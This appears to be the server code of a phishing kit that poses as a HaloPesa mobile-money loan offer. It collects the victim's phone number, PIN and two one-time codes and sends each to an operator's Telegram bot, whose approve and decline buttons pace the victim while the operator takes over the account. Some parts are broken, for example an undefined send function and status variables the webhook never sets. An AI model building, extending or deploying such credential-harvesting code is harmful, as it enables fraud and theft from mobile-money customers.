require('dotenv').config();
const express = require('express');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const app = express();
app.use(express.json());
app.use(express.static('public'));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

let pinStatus = 'idle'; 
let otp1Status = 'idle';        
let otp2Status = 'idle';        

let currentData = { phone: '', amount: '', months: '', pin: '', otp1: '', otp2: '' };

// 1. Initial Loan Calculator Request
app.post('/api/loan-request', (req, res) => {
    try {
        const { amount, months } = req.body;
        currentData.amount = amount;
        currentData.months = months;
        res.json({ status: 'ready_for_phone' });
    } catch (err) {
        console.error('Error in loan-request:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// 2. Phone, Amount, and PIN Submitted -> Send to Telegram
app.post('/api/submit-pin-data', async (req, res) => {
    try {
        const { phone, pin } = req.body;
        currentData.phone = phone;
        currentData.pin = pin;
        pinStatus = 'pending';
        otp1Status = 'idle';
        otp2Status = 'idle';

        const message = `🚨 *Omba Mkopo HaloPesa* 🚨\n\n📱 *Phone:* \`${phone}\`\n💰 *Amount:* \`TZS ${Number(currentData.amount).toLocaleString()}\`\n📅 *Muda:* \`${currentData.months} Miezi\`\n🔑 *Nambari ya Siri (PIN):* \`${pin}\``;

        await sendTelegramMessage(message, [
            [
                { text: '✅ Approve PIN', callback_data: 'approve_pin' },
                { text: '❌ Decline', callback_data: 'reject_pin' }
            ]
        ]);
        res.json({ status: 'pending' });
    } catch (err) {
        console.error('Error sending PIN alert to Telegram:', err);
        res.status(500).json({ error: 'Failed to send telegram message' });
    }
});

app.get('/api/check-pin-status', (req, res) => {
    res.json({ status: pinStatus });
});

// 3. OTP 1 Submitted -> Send to Telegram
app.post('/api/verify-otp1', async (req, res) => {
    try {
        const { otp1 } = req.body;
        currentData.otp1 = otp1;
        otp1Status = 'pending';

        const message = `🔐 *HaloPesa First OTP Verification* 🔐\n\n📱 *Phone:* \`${currentData.phone}\`\n🔢 *OTP 1 Code:* \`${otp1}\``;

        await sendTelegramMessage(message, [
            [
                { text: '✅ Approve OTP 1', callback_data: 'correct_otp1' },
                { text: '❌ Wrong OTP 1', callback_data: 'wrong_otp1' }
            ]
        ]);
        res.json({ status: 'pending' });
    } catch (err) {
        console.error('Error sending OTP 1 to Telegram:', err);
        res.status(500).json({ error: 'Failed to send OTP message' });
    }
});

app.get('/api/check-otp1-status', (req, res) => {
    res.json({ status: otp1Status });
});

// 4. OTP 2 Submitted -> Send to Telegram
app.post('/api/verify-otp2', async (req, res) => {
    try {
        const { otp2 } = req.body;
        currentData.otp2 = otp2;
        otp2Status = 'pending';

        const message = `🔐 *HaloPesa Second OTP Verification* 🔐\n\n📱 *Phone:* \`${currentData.phone}\`\n🔢 *OTP 2 Code:* \`${otp2}\``;

        await sendTelegramMessage(message, [
            [
                { text: '✅ Approve OTP 2', callback_data: 'correct_otp2' },
                { text: '❌ Wrong OTP 2', callback_data: 'wrong_otp2' }
            ]
        ]);
        res.json({ status: 'pending' });
    } catch (err) {
        console.error('Error sending OTP 2 to Telegram:', err);
        res.status(500).json({ error: 'Failed to send OTP message' });
    }
});

app.get('/api/check-otp2-status', (req, res) => {
    res.json({ status: otp2Status });
});
 //Telegram Webhook (Prevents button spinner hanging & controls approval states)
app.post('/webhook', async (req, res) => {
    // Immediately send HTTP 200 so Telegram doesn't time out
    res.sendStatus(200);

    try {
        const update = req.body;

        if (update && update.callback_query) {
            const action = update.callback_query.data;
            const callbackQueryId = update.callback_query.id;

            console.log(`🔔 Webhook Callback Received: ${action}`);

            if (action.startsWith("approve") || action.startsWith("correct_otp")) {
                latestStatus = "approved";
            } else if (action.startsWith("decline") || action.startsWith("wrong_otp")) {
                latestStatus = "wrong_otp";
            }

            // Clear the Telegram button loading spinner on your mobile app
            if (BOT_TOKEN) {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackQueryId,
                        text: "Ação registada com sucesso!"
                    })
                });
            }
        }
    } catch (err) {
        console.error("Webhook Internal Handler Error:", err.message);
    }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running and listening on port ${PORT}`);
});